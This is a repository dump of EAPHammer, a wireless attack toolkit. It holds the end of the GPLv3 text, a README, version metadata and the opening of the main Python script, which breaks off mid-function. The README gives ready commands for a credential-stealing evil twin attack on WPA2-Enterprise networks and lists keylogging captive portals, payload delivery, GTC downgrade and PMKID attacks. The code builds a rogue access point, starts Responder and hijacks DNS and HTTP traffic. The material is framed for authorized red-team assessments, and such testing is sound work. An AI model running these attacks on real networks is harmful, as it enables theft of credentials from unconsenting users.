reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    {one line to give the program's name and a brief idea of what it does.}\n    Copyright (C) {year}  {name of author}\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    {project}  Copyright (C) {year}  {fullname}\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<http://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<http://www.gnu.org/philosophy/why-not-lgpl.html>.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 8.1435546875,
          "content": "![logo](https://rawcdn.githack.com/s0lst1c3/eaphammer/ab8202de4a298957a2bc5662f986cdfb195490e4/docs/img/logo.png)\n\nby Gabriel Ryan ([s0lst1c3](https://twitter.com/s0lst1c3))\n\n[![Foo](https://rawcdn.githack.com/toolswatch/badges/8bd9be6dac2a1d445367001f2371176cc50a5707/arsenal/usa/2017.svg)](https://www.blackhat.com/us-17/arsenal.html#eaphammer)\n\nCurrent release: [v1.14.1](https://github.com/s0lst1c3/eaphammer/releases/tag/v1.14.1)\n\nSupports _Python 3.9+_.\n\nOverview\n--------\n\nEAPHammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. It is designed to be used in full scope wireless assessments and red team engagements. As such, focus is placed on providing an easy-to-use interface that can be leveraged to execute powerful wireless attacks with minimal manual configuration. \nTo illustrate just how fast this tool is, our Quick Start section provides an example of how to execute a credential stealing evil twin attack against a WPA/2-EAP network in just commands.\n\n## Disclaimer\n\nEAPHammer (the \"Software\") and associated documentation is provided “AS IS”. The Developer makes no other warranties, express or implied, and hereby disclaims all implied warranties, including any warranty of merchantability and warranty of fitness for a particular purpose. Any actions or activities related to the use of the Software are the sole responsibility of the end user. The Developer will not be held responsible in the event that any criminal charges are brought against any individuals using or misusing the Software. It is up to the end user to use the Software in an authorized manner and to ensure that their use complies with all applicable laws and regulations.\n\n## Quick Start Guide - Kali\n\n### Install using Apt\n\n```\nsudo apt update\nsudo apt upgrade\nsudo apt install eaphammer\n```\n\n### Build from source\n\nBegin by cloning the __eaphammer__ repo using the following command:\n\n\tgit clone https://github.com/s0lst1c3/eaphammer.git\n\nNext run the kali-setup file as shown below to complete the eaphammer setup process. This will install dependencies and compile the project:\n\n\t./kali-setup\n\n### Basic Usage\n\nTo setup and execute a credential stealing evil twin attack against a WPA/2-EAP network:\n\n\t# generate certificates\n\t./eaphammer --cert-wizard\n\n\t# launch attack\n\t./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds\n\n## Quick Start Guide - Parot OS (Security)\n\nBegin by cloning the __eaphammer__ repo using the following command:\n\n\tgit clone https://github.com/s0lst1c3/eaphammer.git\n\nNext run the parot-setup file as shown below to complete the eaphammer setup process. This will install dependencies and compile the project:\n\n\t./parot-setup\n\nTo setup and execute a credential stealing evil twin attack against a WPA/2-EAP network:\n\n\t# generate certificates\n\t./eaphammer --cert-wizard\n\n\t# launch attack\n\t./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds\n\n\n## Usage and Setup Instructions\n\nFor complete usage and setup instructions, please refer to the project's wiki page:\n\n- [https://github.com/s0lst1c3/eaphammer/wiki](https://github.com/s0lst1c3/eaphammer/wiki)\n\nFeatures\n--------\n\n- Steal RADIUS credentials from WPA-EAP and WPA2-EAP networks.\n- Perform hostile portal attacks to steal AD creds and perform indirect wireless pivots\n- Perform captive portal attacks\n- Built-in Responder integration\n- Support for Open networks and WPA-EAP/WPA2-EAP\n- No manual configuration necessary for most attacks.\n- No manual configuration necessary for installation and setup process\n- Leverages latest version of hostapd (2.8)\n- Support for evil twin and karma attacks\n- Generate timed Powershell payloads for indirect wireless pivots\n- Integrated HTTP server for Hostile Portal attacks\n- Support for SSID cloaking\n- Fast and automated PMKID attacks against PSK networks using hcxtools\n- Password spraying across multiple usernames against a single ESSID\n\n### New (as of Version 1.14.0)(latest):\nAdded support for ESSID Stripping attacks. Fixed many, many bugs.\n\n### Captive Portal with Keylogging, Payload Delivery, and Integrated Website Cloaner (added in version 1.13.5): \nEAPHammer now has a modular captive portal with keylogging and payload delivery capabilities, as well as an integrated website cloaner for easily creating portal modules.\n\n### WPA/2-PSK handshake captures (added as for version 1.7.0)\nEAPHammer now supports WPA/2-PSK along with WPA handshake captures.\n\n### OWE (added as of Version 1.5.0):\nEAPHammer now supports rogue AP attacks against OWE and OWE-Transition mode networks.\n\n### PMF (added as of Version 1.4.0)\nEAPHammer now supports 802.11w (Protected Management Frames), Loud Karma attacks, and Known Beacon attacks (documentation coming soon).\n\n### GTC Downgrade Attacks\nEAPHammer will now automatically attempt a GTC Downgrade attack against connected clients in an attempt to capture plaintext credentials (see: https://www.youtube.com/watch?v=-uqTqJwTFyU&feature=youtu.be&t=22m34s). \n\n### Improved Certificate Handling\nEAPHammer's Cert Wizard has been expanded to provide users with the ability to create, import, and manage SSL certificates in a highly flexible manner. Cert Wizard's previous functionality has been preserved as Cert Wizard's Interactive Mode, which uses the same syntax as previous versions. See [XIV - Cert Wizard](https://github.com/s0lst1c3/eaphammer/wiki/XIV.-Cert-Wizard) for additional details.\n\n### TLS / SSL Backwards Compatibility\nEAPHammer now uses a local build of libssl that exists independently of the systemwide install. This local version is compiled with support for SSLv3, allowing EAPHammer to be used against legacy clients without compromising the integrity of the attacker's operating system.\n\n### Supported EAP Methods\nEAPHammer supports the following EAP methods:\n\n- EAP-PEAP/MSCHAPv2\n- EAP-PEAP/GTC\n- EAP-PEAP/MD5\n- EAP-TTLS/PAP\n- EAP-TTLS/MSCHAP\n- EAP-TTLS/MSCHAPv2\n- EAP-TTLS/MSCHAPv2 (no EAP)\n- EAP-TTLS/CHAP\n- EAP-TTLS/MD5\n- EAP-TTLS/GTC\n- EAP-MD5\n\n\n### 802.11a and 802.11n Support\n\nEAPHammer now supports attacks against 802.11a and 802.11n networks. This includes the ability to create access points that support the following features:\n\n- Both 2.4 GHz and 5 GHz channel support\n- Full MIMO support (multiple input, multiple output)\n- Frame  aggregation\n- Support for 40 MHz channel widths using channel bonding\n- High Throughput Mode\n- Short Guard Interval (Short GI)\n- Modulation & coding scheme (MCS)\n- RIFS\n- HT power management\n\n\n## Contributing\n\nContributions are encouraged and more than welcome. Please attempt to adhere to the provided issue and feature request templates.\n\n## Versioning\n\nWe use [SemVer](http://semver.org/) for versioning (or at least make an effort to). For the versions available, see  [https://github.com/s0lst1c3/eaphammer/releases](https://github.com/s0lst1c3/eaphammer/releases). \n\n## License\n\nThis project is licensed under the GNU Public License 3.0 - see the [LICENSE.md](LICENSE.md) file for details.\n\n## Acknowledgments\nThis tool either builds upon, is inspired by, or directly incorporates nearly fifteen years of prior research and development from the following awesome people:\n\n* Brad Antoniewicz\n* Joshua Wright\n* Robin Wood\n* Dino Dai Zovi\n* Shane Macauly\n* Domanic White\n* Ian de Villiers\n* Michael Kruger\n* Moxie Marlinspike\n* David Hulton\n* Josh Hoover\n* James Snodgrass\n* Adam Toscher\n* George Chatzisofroniou\n* Mathy Vanhoef\n* Raúl Calvo Laorden\n\nFor a complete description of what each of these people has contributed to the current wireless security landscape and this tool, please see:\n\n* [https://github.com/s0lst1c3/eaphammer/wiki/Acknowledgements](https://github.com/s0lst1c3/eaphammer/wiki/Acknowledgements)\n\nEAPHammer leverages a modified  version of [hostapd-wpe](https://github.com/opensecurityresearch/hostapd-wpe) (shoutout to [Brad Anton](https://github.com/brad-anton) for creating the original), _dnsmasq_, [asleap](https://github.com/joswr1ght/asleap), [hcxpcaptool](https://github.com/ZerBea/hcxtools) and [hcxdumptool](https://github.com/ZerBea/hcxdumptool) for PMKID attacks, [Responder](https://github.com/SpiderLabs/Responder), and _Python 3.5+_.\n\nFinally, huge shoutout to the [SpecterOps](https://specterops.io/) crew for supporting this project and being a constant source of inspiration.\n\n"
        },
        {
          "name": "SECURITY.md",
          "type": "blob",
          "size": 0.111328125,
          "content": "# Security Policy\n\n## Reporting a Vulnerability\n\nIf you find any security issues, please open an issue on GitHub.\n"
        },
        {
          "name": "__version__.py",
          "type": "blob",
          "size": 0.2001953125,
          "content": "__version__ = '1.14.1'\n__codename__ = 'Final Frontier'\n__author__ = '@s0lst1c3'\n__contact__ = 'gabriel<<at>>transmitengage.com'\n__tagline__ = 'Now with more fast travel than a next-gen Bethesda game. >:D'\n"
        },
        {
          "name": "base",
          "type": "tree",
          "content": null
        },
        {
          "name": "cert_wizard",
          "type": "tree",
          "content": null
        },
        {
          "name": "certs",
          "type": "tree",
          "content": null
        },
        {
          "name": "core",
          "type": "tree",
          "content": null
        },
        {
          "name": "db",
          "type": "tree",
          "content": null
        },
        {
          "name": "docs",
          "type": "tree",
          "content": null
        },
        {
          "name": "eaphammer",
          "type": "blob",
          "size": 36.56640625,
          "content": "#!/usr/bin/env python3\n\nimport argparse\nimport cert_wizard\nimport core.cli\nimport core.eap_spray\nimport datetime\nimport json\nimport os\nimport signal\nimport subprocess\nimport sys\nimport time\nimport shutil\n\nfrom argparse import ArgumentParser\nfrom core import conf_manager, utils, responder, services\nfrom core.autocrack import Autocrack\nfrom core import iw_parse\nfrom core.hostapd import HostapdEaphammer\nfrom core.hostapd_config import HostapdConfig\nfrom core.eap_user_file import EAPUserFile\nfrom core.hostapd_mac_acl import HostapdMACACL\nfrom core.hostapd_ssid_acl import HostapdSSIDACL\nfrom core.known_ssids_file import KnownSSIDSFile\nfrom core.responder_config import ResponderConfig\nfrom core.lazy_file_reader import LazyFileReader\nfrom core.redirect_server import RedirectServer\nfrom core.wpa_supplicant import WPA_Supplicant\nfrom core.wpa_supplicant_conf import WPASupplicantConf\nfrom core.portal_server import PortalServer\nfrom datetime import datetime\nfrom multiprocessing import Queue\nfrom settings import settings\nfrom __version__ import __version__, __tagline__, __author__, __contact__, __codename__\nfrom threading import Thread\nfrom core.utils import ip_replace_last_octet\nfrom core.utils import strtobool\nfrom core.loader import Loader\n\nfrom core.module_maker import ModuleMaker\n\ndef hostile_portal():\n\n    global responder\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])\n    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])\n    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])\n\n\n    use_autocrack = options['autocrack']\n    wordlist = options['wordlist']\n    if options['manual_config'] is None:\n        interface = core.interface.Interface(options['interface'])\n    else:\n        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])\n        interface = core.interface.Interface(interface_name)\n    use_pivot = options['pivot']\n    save_config = options['save_config']\n\n    try:\n        utils.Iptables.save_rules()\n    \n        # start autocrack if enabled\n        if use_autocrack:\n\n            autocrack = Autocrack.get_instance()\n            autocrack.configure(wordlist=wordlist)\n            autocrack.start()\n            time.sleep(4)\n\n        # prepare environment\n        if use_nm:\n            interface.nm_off()\n        \n        if stop_dhcpcd:\n            services.Dhcpcd.stop()\n\n        if stop_avahi:\n            services.Avahi.stop()\n        utils.set_ipforward(1)\n\n        if options['auth'] == 'wpa-eap':\n\n            # generate eap user file and write to tmp directory\n            eap_user_file = EAPUserFile(settings, options)\n            eap_user_file.generate()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n            hostapd_acl = HostapdMACACL(settings, options)\n            hostapd_acl.generate()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n            hostapd_ssid_acl = HostapdSSIDACL(settings, options)\n            hostapd_ssid_acl.generate()\n\n        if options['known_beacons']:\n            known_ssids_file = KnownSSIDSFile(settings, options)\n            known_ssids_file.generate()\n\n        # write hostapd config file to tmp directory\n        hostapd_conf = HostapdConfig(settings, options)\n        hostapd_conf.write()\n\n        # start hostapd\n        hostapd = HostapdEaphammer(settings, options)\n        hostapd.start()\n\n        # configure routing \n        interface.set_ip_and_netmask(lhost, lmask)\n        os.system('route add -net %s netmask %s gw %s' %\\\n                 (lnet, lmask, lhost))\n\n        # configure dnsmasq\n        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface),\n                                                          lhost=lhost)\n        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])\n\n        # start RedirectServer\n        rs = RedirectServer.get_instance()\n        rs.configure(lhost)\n        rs.start()\n\n        # start Responder\n        if use_pivot:\n\n            print('[*] Pivot mode activated. Rogue SMB server disabled.')\n            print ('[*] Run payload_generator to '\n                        'generate a timed payload if desired.')\n\n            settings.dict['core']['responder']['Responder Core']['SMB'] = 'Off'\n\n        else:\n\n            settings.dict['core']['responder']['Responder Core']['SMB'] = 'On'\n\n\n        responder_conf = ResponderConfig(settings, options)\n        responder_conf.write()\n\n        resp = responder.Responder.get_instance()\n        resp.start(str(interface))\n\n        # set iptables policy, flush all tables for good measure\n        utils.Iptables.accept_all()\n        utils.Iptables.flush()\n        utils.Iptables.flush('nat')\n\n        # use iptables to redirect all DNS and HTTP(S) traffic to PHY\n        utils.Iptables.route_dns2_addr(lhost, interface)\n        utils.Iptables.route_http2_addr(lhost, interface)\n\n        # pause execution until user quits\n        input('\\n\\nPress enter to quit...\\n\\n')\n\n        resp.stop()\n\n        hostapd.stop()\n        services.Dnsmasq.kill()\n        rs.stop()\n        if use_autocrack:\n            autocrack.stop()\n\n        # remove hostapd conf file from tmp directory\n        if save_config:\n            hostapd_conf.save()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n\n        # restore iptables to a clean state (policy, flush tables)\n        utils.Iptables.accept_all()\n        utils.Iptables.flush()\n        utils.Iptables.flush('nat')\n\n        utils.Iptables.restore_rules()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\n\n    except KeyboardInterrupt:\n\n        resp.stop()\n    \n        hostapd.stop()\n        services.Dnsmasq.kill()\n        rs.stop()\n        resp.stop()\n        if use_autocrack:\n            autocrack.stop()\n\n        # remove hostapd conf file from tmp directory\n        if save_config:\n            hostapd_conf.save()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n        \n        # restore iptables to a clean state (policy, flush tables)\n        utils.Iptables.accept_all()\n        utils.Iptables.flush()\n        utils.Iptables.flush('nat')\n\n        utils.Iptables.restore_rules()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\ndef captive_portal_server_only():\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    try:\n\n        # initialize, configure, and start PortalServer\n        portal_server = PortalServer.get_instance()\n        portal_server.configure(options)\n        portal_server.start()\n        \n        ## pause execution until user quits\n        input('\\n\\nPress enter to quit...\\n\\n')\n\n        portal_server.stop()\n\n    except KeyboardInterrupt:\n\n        portal_server.stop()\n\n\ndef troll_defender():\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])\n    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])\n    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])\n\n\n    interface = core.interface.Interface(options['interface'])\n\n    try:\n\n        utils.Iptables.save_rules()\n\n        if use_nm:\n            interface.nm_off()\n        \n        if stop_dhcpcd:\n            services.Dhcpcd.stop()\n\n        if stop_avahi:\n            services.Avahi.stop()\n\n        options['essid'] = 'C:\\\\Temp\\\\Invoke-Mimikatz.ps1'\n\n        if options['auth'] == 'wpa-eap':\n\n            # generate eap user file and write to tmp directory\n            eap_user_file = EAPUserFile(settings, options)\n            eap_user_file.generate()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n            hostapd_acl = HostapdMACACL(settings, options)\n            hostapd_acl.generate()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n            hostapd_ssid_acl = HostapdSSIDACL(settings, options)\n            hostapd_ssid_acl.generate()\n\n        if options['known_beacons']:\n            known_ssids_file = KnownSSIDSFile(settings, options)\n            known_ssids_file.generate()\n\n        # write hostapd config file to tmp directory\n        hostapd_conf = HostapdConfig(settings, options)\n        hostapd_conf.write()\n\n        # start hostapd\n        hostapd = HostapdEaphammer(settings, options)\n        hostapd.start()\n\n        # pause execution until user quits  \n        input('\\n\\nPress enter to quit...\\n\\n')\n\n        hostapd.stop()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\n    except KeyboardInterrupt:\n\n        hostapd.stop()\n\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n\n        if options['known_beacons']:\n            known_ssids_file.remove()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\ndef captive_portal():\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    if options['manual_config'] is None:\n        interface = core.interface.Interface(options['interface'])\n    else:\n        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])\n        interface = core.interface.Interface(interface_name)\n    use_autocrack = options['autocrack']\n    wordlist = options['wordlist']\n    save_config = options['save_config']\n\n    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])\n    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])\n    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])\n\n\n\n    try:\n\n        utils.Iptables.save_rules()\n\n        # prepare environment\n        utils.set_ipforward(1)\n        if use_nm:\n            interface.nm_off()\n        \n        if stop_dhcpcd:\n            services.Dhcpcd.stop()\n\n        if stop_avahi:\n            services.Avahi.stop()\n\n        # start autocrack if enabled\n        if use_autocrack:\n\n            autocrack = Autocrack.get_instance()\n            autocrack.configure(wordlist=wordlist)\n            autocrack.start()\n\n        if options['auth'] == 'wpa-eap':\n\n            # generate eap user file and write to tmp directory\n            eap_user_file = EAPUserFile(settings, options)\n            eap_user_file.generate()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n            hostapd_acl = HostapdMACACL(settings, options)\n            hostapd_acl.generate()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n            hostapd_ssid_acl = HostapdSSIDACL(settings, options)\n            hostapd_ssid_acl.generate()\n\n        if options['known_beacons']:\n            known_ssids_file = KnownSSIDSFile(settings, options)\n            known_ssids_file.generate()\n\n        # write hostapd config file to tmp directory\n        hostapd_conf = HostapdConfig(settings, options)\n        hostapd_conf.write()\n\n        # start hostapd\n        hostapd = HostapdEaphammer(settings, options)\n        hostapd.start()\n\n        # configure routing \n        interface.set_ip_and_netmask(lhost, lmask)\n        os.system('route add -net %s netmask %s gw %s' %\n                    (lnet, lmask, lhost))\n\n        # configure dnsmasq\n        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface),\n                                                          lhost=lhost)\n        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])\n\n        ## start httpd\n        #services.Httpd.start()\n    \n\n        # set iptables policy, flush all tables for good measure\n        utils.Iptables.accept_all()\n        utils.Iptables.flush()\n        utils.Iptables.flush('nat')\n\n        # use iptables to redirect all DNS and HTTP(S) traffic to PHY\n        utils.Iptables.route_dns2_addr(lhost, interface)\n        utils.Iptables.route_http2_addr(lhost, interface)\n        \n        # ADD CODE HERE\n        # initialize, configure, and start PortalServer\n        portal_server = PortalServer.get_instance()\n        portal_server.configure(options)\n        portal_server.start()\n        ###\n        \n        ## pause execution until user quits\n        input('\\n\\nPress enter to quit...\\n\\n')\n\n        hostapd.stop()\n        services.Dnsmasq.kill()\n\n        #services.Httpd.stop()\n        # ADD CODE HERE\n        portal_server.stop()\n        ###\n\n        if use_autocrack:\n            autocrack.stop()\n\n        # remove hostapd conf file from tmp directory\n        if save_config:\n            hostapd_conf.save()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n\n        if options['known_beacons']:\n            known_ssids_file.remove()\n        \n        # restore iptables to a clean state (policy, flush tables)\n        utils.Iptables.accept_all()\n        utils.Iptables.flush()\n        utils.Iptables.flush('nat')\n\n        utils.Iptables.restore_rules()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\n    except KeyboardInterrupt:\n\n        portal_server.stop()\n        hostapd.stop()\n        services.Dnsmasq.kill()\n        portal_server.stop()\n        if use_autocrack:\n            autocrack.stop()\n\n        # remove hostapd conf file from tmp directory\n        if save_config:\n            hostapd_conf.save()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n\n        if options['known_beacons']:\n            known_ssids_file.remove()\n        \n        # restore iptables to a clean state (policy, flush tables)\n        utils.Iptables.accept_all()\n        utils.Iptables.flush()\n        utils.Iptables.flush('nat')\n\n        utils.Iptables.restore_rules()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\ndef troll_defender():\n\n    lport = options['lport']\n  